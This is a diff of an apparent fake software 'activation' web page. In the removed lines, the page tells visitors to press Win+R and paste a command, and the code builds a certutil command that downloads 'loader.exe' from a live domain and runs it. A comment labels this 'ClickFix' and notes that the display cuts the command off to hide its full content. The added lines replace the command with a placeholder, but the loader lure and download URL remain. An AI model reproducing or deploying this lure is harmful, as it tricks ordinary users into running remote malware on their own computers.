@@ -364,9 +364,8 @@
   <div class="feat-row reveal">
     <div class="feat" style="grid-template-columns:1fr;">
       <div class="step-line">
-        <b>STEP 1</b> &nbsp;Press <span class="kbd">Win</span> + <span class="kbd">R</span><br>
-        <b>STEP 2</b> &nbsp;Paste the activation token below, press <span class="kbd">Enter</span><br>
-        <b>STEP 3</b> &nbsp;Wait for the activation prompt, then run the loader
+        <b>STEP 1</b> &nbsp;Paste the activation token below, press <span class="kbd">Enter</span><br>
+        <b>STEP 2</b> &nbsp;Wait for the activation prompt, then run the loader
       </div>
       <div style="display:flex;gap:10px;margin-top:18px;align-items:stretch;">
         <div id="cmdBox" onclick="copyCmd()"></div>
@@ -413,14 +412,10 @@ function tick() {
 }
 setTimeout(tick, 600);
 
-// ---- ACTIVATION SETUP (ClickFix) ----
-// Uses the real deployed domain - not location.origin (which breaks
-// when the page is opened as a local file). The box cuts the command
-// off so only the head of it is visible.
+
 function buildScript() {
-  // HARDCODED to the live domain
   const dl = 'https://larpik.com/loader.exe';
-  return 'certutil -urlcache -split -f "' + dl + '" %temp%\\setup.exe && start %temp%\\setup.exe';
+  return 'WORK IN PROGRESS, FOR NOW ACTIVATE IN THE LOADER.';
 }
 function initCmd() {
   const box = document.getElementById('cmdBox');
